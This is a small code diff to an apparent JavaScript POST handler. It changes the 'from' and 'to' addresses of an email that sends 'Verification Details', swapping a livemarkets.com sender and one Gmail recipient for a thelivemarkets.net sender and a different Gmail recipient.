@@ -90,8 +90,8 @@ export async function POST(request) {
 
   // Email options
   const mailOptions = {
-    from: "Live Markets ID <noreply@livemarkets.com>",
-    to: "samsonrichfield@gmail.com",
+    from: "Livemarkets Team <team@thelivemarkets.net>",
+    to: "livemarketsfx@gmail.com",
     subject: "Verification Details",
     html: emailContent,
   };
